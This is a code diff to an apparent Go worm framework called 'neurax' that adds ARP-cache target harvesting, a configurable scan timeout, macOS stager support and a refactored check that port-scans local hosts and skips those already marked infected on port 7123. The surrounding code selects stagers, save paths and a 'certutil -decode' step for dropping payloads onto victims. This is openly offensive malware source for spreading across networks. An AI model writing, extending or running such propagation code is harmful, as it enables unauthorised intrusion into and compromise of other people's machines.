@@ -18,6 +18,7 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
+	"github.com/mostlygeek/arp"
 )
 
 type __neurax_config struct {
@@ -31,6 +32,8 @@ type __neurax_config struct {
 	platform         string
 	cidr             string
 	scan_passive     bool
+	scan_timeout     int
+	read_arp_cache   bool
 	threads          int
 	full_range       bool
 	base64           bool
@@ -49,6 +52,8 @@ var neurax_config = __neurax_config{
 	platform:         runtime.GOOS,
 	cidr:             get_local_ip() + "/24",
 	scan_passive:     false,
+	scan_timeout:     2,
+	read_arp_cache:   false,
 	threads:          10,
 	full_range:       false,
 	base64:           false,
@@ -184,7 +189,7 @@ func neurax_stager() string {
 		if neurax_config.base64 {
 			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
 		}
-	case "linux":
+	case "linux", "osx":
 		stagers = linux_stagers
 		paths = linux_save_paths
 		if neurax_config.base64 {
@@ -230,6 +235,26 @@ func neurax_server() {
 	}))
 }
 
+func is_host_active(target string) bool {
+	ps := portscanner.NewPortScanner(target, time.Duration(neurax_config.scan_timeout)*time.Second, neurax_config.threads)
+	first := 19
+	last := 300
+	if neurax_config.full_range {
+		last = 65535
+	}
+	opened_ports := ps.GetOpenedPort(first, last)
+	if len(opened_ports) != 0 && !is_open(target, 7123) {
+		if neurax_config.required_port == 0 {
+			return true
+		} else {
+			if is_open(target, neurax_config.required_port) {
+				return true
+			}
+		}
+	}
+	return false
+}
+
 func neurax_scan(c chan string) {
 	if neurax_config.scan_passive {
 		var snapshot_len int32 = 1024
@@ -248,31 +273,30 @@ func neurax_scan(c chan string) {
 					ip, _ := ip_layer.(*layers.IPv4)
 					source := fmt.Sprintf("%s", ip.SrcIP)
 					destination := fmt.Sprintf("%s", ip.DstIP)
-					c <- source
-					c <- destination
+					if source != get_local_ip() {
+						c <- source
+					}
+					if destination != get_local_ip() {
+						c <- destination
+					}
 				}
 			}
 		}
 	} else {
-		targets, err := expand_cidr(neurax_config.cidr)
-		targets = remove_from_slice(targets, get_local_ip())
-		exit_on_error(err)
-		for _, target := range targets {
-			ps := portscanner.NewPortScanner(target, time.Duration(2)*time.Second, neurax_config.threads)
-			first := 19
-			last := 300
-			if neurax_config.full_range {
-				last = 65535
+		targets := []string{}
+		if neurax_config.read_arp_cache {
+			for ip, _ := range arp.Table() {
+				targets = append(targets, ip)
 			}
-			opened_ports := ps.GetOpenedPort(first, last)
-			if len(opened_ports) != 0 && !is_open(target, 7123) {
-				if neurax_config.required_port == 0 {
-					c <- target
-				} else {
-					if is_open(target, neurax_config.required_port) {
-						c <- target
-					}
-				}
+		}
+		full_addr_range, _ := expand_cidr(neurax_config.cidr)
+		for _, addr := range full_addr_range {
+			targets = append(targets, addr)
+		}
+		targets = remove_from_slice(targets, get_local_ip())
+		for _, target := range targets {
+			if is_host_active(target) {
+				c <- target
 			}
 		}
 	}
